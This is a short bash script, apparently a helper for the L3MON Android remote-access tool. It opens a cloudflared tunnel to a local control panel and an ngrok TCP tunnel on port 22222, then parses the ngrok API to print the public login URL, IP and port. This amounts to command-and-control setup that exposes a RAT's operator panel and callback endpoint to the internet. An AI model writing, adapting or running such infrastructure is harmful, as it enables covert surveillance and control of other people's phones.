#!/bin/bash
Green='\033[0;32m'
IGreen='\033[0;92m'
Yellow='\033[0;33m'
IYellow='\033[0;93m'
clear='\033[0m'
# wget -qO cloudflared https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64
# wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz
chmod +x /L3MON/cloudflared > /dev/null &
echo > /L3MON/.cf.log > /dev/null &
/L3MON/cloudflared tunnel -url 127.0.0.1:22533 --logfile /L3MON/.cf.log > /dev/null 2>&1 &
sleep 8
/L3MON/ngrok tcp 22222 > /dev/null &
sleep 8
cdf=$(cat /L3MON/.cf.log | grep -o 'https://[-0-9a-z]*\.trycloudflare.com')
#brows=$(curl -s localhost:4040/api/tunnels|jq -r .tunnels[0,1].public_url|grep https)
#links=$(curl -s localhost:4040/api/tunnels|jq -r .tunnels[0].public_url|grep tcp)
ip=$(curl -s localhost:4040/api/tunnels|jq -r .tunnels[0,1].public_url|grep tcp|sed 's#:#\n#g;s#//##g'|grep io|sed 's#^#host #g'|bash|awk '{print $NF}'|sed -n '1p')
#ip=$(curl -s localhost:4040/api/tunnels|jq -r '.tunnels[].public_url'|grep tcp|cut -d/ -f3|cut -d: -f1|xargs -I@ sh -c 'host @'|awk "{print \$NF}")
#ip=$(curl -s localhost:4040/api/tunnels|jq -r '.tunnels[].public_url'|grep ^tcp|sed 's#tcp://##;s#:.*##'|head -1|xargs -I@ sh -c 'host @|awk "{print \$NF}"')
#ip=$(curl -s localhost:4040/api/tunnels | jq -r '.tunnels[].public_url' | grep ^tcp | sed 's#tcp://##;s#:.*##' | head -1|sed 's#^#host #g'|bash|awk '{print $NF}')


#port=$(curl -s localhost:4040/api/tunnels|jq -r .tunnels[0,1].public_url|grep tcp|sed 's#:#\n#g;s#//##g'|tail -1)
port=$(curl -s localhost:4040/api/tunnels|jq -r '.tunnels[].public_url'|grep tcp|cut -d/ -f3|cut -d: -f2)

echo -e "$Green \b[$IGreen \bOK$Green \b]$Cyan LOGIN$Green        =$IYellow $cdf"
#echo -e "$Green \b[$IGreen \bOK$Green \b]$Cyan LOGIN$Green        =$IYellow $brows"
#echo -e "$Green \b[$IGreen \bOK$Green \b]$Cyan TCP  $Green        =$IYellow $links"
echo -e "$Green \b[$IGreen \bOK$Green \b]$Cyan IP   $Green        =$IYellow $ip"
echo -e "$Green \b[$IGreen \bOK$Green \b]$Cyan VPORT$Green        =$IYellow $port $clear"
